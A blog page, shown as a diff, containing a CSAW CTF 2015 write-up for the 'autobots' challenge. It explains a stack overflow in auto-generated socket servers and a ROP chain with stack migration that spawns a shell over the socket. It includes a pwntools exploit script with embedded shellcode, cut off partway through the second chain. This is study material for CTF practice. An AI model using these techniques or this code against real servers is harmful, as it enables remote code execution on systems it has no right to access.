@@ -1,0 +1,795 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>CSAW CTF 2015 – autobots - Hacking Tube 2.0</title>
+<meta name="description" content="Category: ExploitablePoints: 350">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="CSAW CTF 2015 – autobots">
+<meta property="og:url" content="http://0.0.0.0:4000/csaw-ctf-2015-autobots/">
+
+
+  <meta property="og:description" content="Category: ExploitablePoints: 350">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2015-09-22T23:33:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/csaw-ctf-2015-autobots/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="CSAW CTF 2015 – autobots">
+    <meta itemprop="description" content="Category: ExploitablePoints: 350">
+    <meta itemprop="datePublished" content="September 22, 2015">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">CSAW CTF 2015 – autobots
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> Exploitable
+<strong>Points:</strong> 350</p>
+
+<blockquote>
+  <p>I hear bots are playing ctfs now.
+<code class="highlighter-rouge">nc 52.20.10.244 8888</code></p>
+</blockquote>
+
+<!-- more -->
+
+<p>Once we connect to the service, it will send us a 64 bit ELF binary.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">size_t</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// rax@1
+</span>    <span class="kr">__int16</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+0h] [bp-80h]@1
+</span>    <span class="kt">uint16_t</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [sp+2h] [bp-7Eh]@1
+</span>    <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [sp+4h] [bp-7Ch]@1
+</span>    <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [sp+10h] [bp-70h]@1
+</span>    <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [sp+78h] [bp-8h]@1
+</span>    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span> <span class="c1">// [sp+7Ch] [bp-4h]@1
+</span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">);</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="n">v7</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">v6</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mh">0xF5A6u</span><span class="p">);</span> <span class="c1">// port number
+</span>    <span class="n">bind</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x10u</span><span class="p">);</span>
+    <span class="n">listen</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+    <span class="n">v9</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x1E0uLL</span><span class="p">);</span> <span class="c1">// BOF vulnerability
+</span>    <span class="n">v3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">write</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We can see that this binary was another socket server program, which has a simple stack overflow vulnerability in it. But after I reversed the binary, got the port number and connected to the service, it gave me nothing.</p>
+
+<p>At first I thought this was such a crap, but then I found out that each time I connected to the original service, <strong>it’ll gave me a different binary</strong>. It’s still a socket server program, which wait for our connection, read the input and output our input, but it has a different port number, different buffer location &amp; different reading size.</p>
+
+<p>After having some discussion with my teammates, we figure out that maybe the challenge want us to exploit the service like a bot, which means that we’ll have to figure out the port number, buffer size and try to exploit the service – all done fully automatically.</p>
+
+<p>So the first thing we’ll have to do is to retrieve some informations in the binary, such as port number, buffer’s location and reading size. By using <strong>objdump</strong>, we can analyze the assembly and retrieve those informations:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.................
+  4007c8:       bf a6 f5 00 00          mov    $0xf5a6,%edi     &lt;-- port number = 0xf5a6
+  4007cd:       e8 2e fe ff ff          callq  400600 &lt;htons@plt&gt;
+...................
+  40082d:       48 8d 45 90             lea    -0x70(%rbp),%rax     &lt;-- buffer's location (offset from rbp)
+  400831:       48 89 c7                mov    %rax,%rdi
+  400834:       e8 b7 fd ff ff          callq  4005f0 &lt;strlen@plt&gt;
+....................
+  400816:       8b 45 f8                mov    -0x8(%rbp),%eax
+  400819:       ba e0 01 00 00          mov    $0x1e0,%edx     &lt;-- reading size
+  40081e:       48 89 ce                mov    %rcx,%rsi
+  400821:       89 c7                   mov    %eax,%edi
+  400823:       b8 00 00 00 00          mov    $0x0,%eax
+  400828:       e8 f3 fd ff ff          callq  400620 &lt;read@plt&gt;
+
+</code></pre></div></div>
+
+<p>Now we figure out the port number, we can connect to the service immediately after we get the binary. This time, it actually wait for me to input a string and send it back to me.</p>
+
+<p>So we’re on the right track, time to exploit the service. Notice that sometimes the binary’s not exploitable, because its reading size might be smaller than the buffer’s offset from the <code class="highlighter-rouge">rbp</code>. Anyway, once we know that the service is exploitable, we can send our payload and try to do the <strong>ROP attack</strong> ( the binary has enable the DEP protection ).</p>
+
+<p>But before that, there’re few things we need to beware of:</p>
+<ol>
+  <li>It’s a socket server, so if we want to spawn a shell and execute our own command, <strong>we’ll have to use <code class="highlighter-rouge">dup2()</code> to copy <code class="highlighter-rouge">stdin</code> &amp; <code class="highlighter-rouge">stdout</code> to our socket fd.</strong></li>
+  <li>Our socket fd is <strong>6</strong>, we can leak it with the help of the <code class="highlighter-rouge">write</code> function</li>
+  <li>The socket fd is also on stack, so while overwriting the return address, the socket fd should remain the same.</li>
+</ol>
+
+<p>Consider that the reading size might not be big enough to read the whole ROP chain, I decide to use the <strong>stack migration</strong> trick:</p>
+<ol>
+  <li>After overwriting the return address in main function, the first thing we do is to read the 2nd ROP chain to a data segment (buffer1) , and change the stack to buffer1 ( by using the <code class="highlighter-rouge">pop rbp; ret</code> and <code class="highlighter-rouge">leave; ret</code> gadget )</li>
+  <li>The 2nd ROP chain is to leak the address in libc, read the 3rd ROP chain to buffer2, and change the stack to buffer2</li>
+  <li>Finally the 3rd ROP chain will do <code class="highlighter-rouge">dup2(6, 0)</code>, <code class="highlighter-rouge">dup2(6, 1)</code> and <code class="highlighter-rouge">system("/bin/sh")</code></li>
+</ol>
+
+<p>We can use <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> to find some useful gadgets, such as <code class="highlighter-rouge">pop rdi; ret</code> and <code class="highlighter-rouge">pop rsi; pop r15; ret</code> for setting the function parameters. Notice that although we can’t find a gadget to control <code class="highlighter-rouge">rdx</code> (storing the 3rd function parameter), but since only <code class="highlighter-rouge">read</code> and <code class="highlighter-rouge">write</code> function need the third parameter, we can leverage the fact that <strong>the program has already set the <code class="highlighter-rouge">rdx</code> for us in the main function</strong> (for writing our output).</p>
+
+<p>So to sum it up:</p>
+<ol>
+  <li>Use objdump to get the port number, buffer location and reading size</li>
+  <li>Use ROPgadget to find some useful gadgets (for setting parameters &amp; stack migration)</li>
+  <li>Overwrite the return address, notice that the socket fd should not be modified</li>
+  <li>First ROP chain: read the 2nd ROP chain to buffer1 and change the stack</li>
+  <li>Second ROP chain: leak libc’s base address, read the 3rd ROP chain to buffer2 and change the stack</li>
+  <li>Third ROP chain: do <code class="highlighter-rouge">dup2(6, 0)</code>, <code class="highlighter-rouge">dup2(6, 1)</code> and <code class="highlighter-rouge">system("/bin/sh")</code></li>
+</ol>
+
+<p>For finding the libc version, here’s an useful tool: <a href="https://github.com/niklasb/libc-database">libc database</a></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"52.20.10.244"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">8888</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="c"># setting </span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c">#context.arch = 'i386'</span>
+<span class="c">#context.arch = 'arm'</span>
+<span class="c">#context.arch = 'aarch64'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="c">#elf = ELF(ELF_PATH)</span>
+<span class="c">#libc = ELF(LIBC_PATH)</span>
+
+<span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="n">c</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">sc</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">"i386"</span><span class="p">:</span>
+        <span class="c"># shellcraft.i386.linux.sh(), null free, 22 bytes</span>
+        <span class="k">return</span> <span class="s">"</span><span class="se">\x6a\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0e\x58\x48\x48\x48\x99\xcd\x80</span><span class="s">"</span>
+    <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">"amd64"</span><span class="p">:</span>
+        <span class="c"># shellcraft.amd64.linux.sh(), null free, 24 bytes</span>
+        <span class="k">return</span> <span class="s">"</span><span class="se">\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05</span><span class="s">"</span>
+    <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">"arm"</span><span class="p">:</span>
+        <span class="c"># null free, 27 bytes</span>
+        <span class="k">return</span> <span class="s">"</span><span class="se">\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x09\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68</span><span class="s">"</span>
+    <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s">"aarch64"</span><span class="p">:</span>
+        <span class="c"># 4 null bytes, total 35 bytes</span>
+        <span class="k">return</span> <span class="s">"</span><span class="se">\x06\x00\x00\x14\xe0\x03\x1e\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x00\xd4\xfb\xff\xff\x97\x2f\x62\x69\x6e\x2f\x73\x68</span><span class="s">"</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">None</span>
+
+<span class="k">def</span> <span class="nf">str_addr</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">f</span><span class="p">):</span> <span class="c"># search string address in file</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">):</span> <span class="c"># no result</span>
+        <span class="k">return</span> <span class="bp">None</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">myexec</span><span class="p">(</span><span class="s">"nc 52.20.10.244 8888 &gt; asdf"</span><span class="p">)</span> <span class="c"># download binary</span>
+        
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">myexec</span><span class="p">(</span><span class="s">"objdump -d ./asdf | grep </span><span class="se">\"</span><span class="s">htons</span><span class="se">\"</span><span class="s"> -B 1"</span><span class="p">)</span> <span class="c"># get port number</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"--</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">port</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="n">resp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">):</span><span class="n">resp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">","</span><span class="p">):]</span>
+        <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+        
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">myexec</span><span class="p">(</span><span class="s">"objdump -d ./asdf | grep </span><span class="se">\"</span><span class="s">strlen</span><span class="se">\"</span><span class="s"> -B 2"</span><span class="p">)</span> <span class="c"># get buffer offset</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"lea    -"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">offset</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="p">[:</span><span class="n">resp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"(</span><span class="si">%</span><span class="s">rbp"</span><span class="p">):],</span> <span class="mi">16</span><span class="p">)</span>
+        
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">myexec</span><span class="p">(</span><span class="s">"objdump -d ./asdf | grep </span><span class="se">\"</span><span class="s">read</span><span class="se">\"</span><span class="s"> -B 4"</span><span class="p">)</span> <span class="c"># read size</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"mov"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="n">resp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"0x"</span><span class="p">):</span><span class="n">resp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">","</span><span class="p">):]</span>
+        <span class="n">read</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+
+        <span class="k">print</span> <span class="s">"==================="</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"port: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"offset: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"read: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">read</span><span class="p">))</span>
+        
+        <span class="k">if</span> <span class="n">read</span> <span class="o">&lt;</span> <span class="mh">0x80</span> <span class="ow">or</span> <span class="n">read</span> <span class="o">&lt;</span> <span class="n">offset</span> <span class="ow">or</span> <span class="n">offset</span><span class="o">-</span><span class="mi">8</span> <span class="o">&lt;</span> <span class="mh">0x78</span><span class="p">:</span> <span class="c"># exploitable or not</span>
+            <span class="k">continue</span>
+
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+        <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./asdf"</span><span class="p">)</span>
+        
+        <span class="c"># use ROPgadget to find some useful address</span>
+        <span class="n">pop_rdi</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">myexec</span><span class="p">(</span><span class="s">"ROPgadget --binary ./asdf | grep </span><span class="se">\"</span><span class="s">pop rdi</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">myexec</span><span class="p">(</span><span class="s">"ROPgadget --binary ./asdf | grep </span><span class="se">\"</span><span class="s">pop rsi </span><span class="se">\"</span><span class="s">"</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="n">leave</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">myexec</span><span class="p">(</span><span class="s">"ROPgadget --binary ./asdf | grep </span><span class="se">\"</span><span class="s">leave</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="n">pop_rbp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">myexec</span><span class="p">(</span><span class="s">"ROPgadget --binary ./asdf | grep </span><span class="se">\"</span><span class="s">: pop rbp ; ret$</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"pop_rdi: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">))</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"pop_rsi_r15: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">))</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"leave: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leave</span><span class="p">))</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"pop_rbp: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">))</span>
+        <span class="n">buf1</span> <span class="o">=</span> <span class="mh">0x00602000</span> <span class="o">-</span> <span class="mh">0x200</span>
+        <span class="n">buf2</span> <span class="o">=</span> <span class="mh">0x00602000</span> <span class="o">-</span> <span class="mh">0x300</span>
+
+        <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="c"># socket fd</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">8</span> <span class="c"># rbp</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="c"># return address</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf1</span><span class="p">)</span> <span class="c"># read the 2nd ROP chain to buffer1</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'read'</span><span class="p">])</span> <span class="c"># read(6, buffer1, len)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">)</span> <span class="c"># stack migration</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf1</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span>
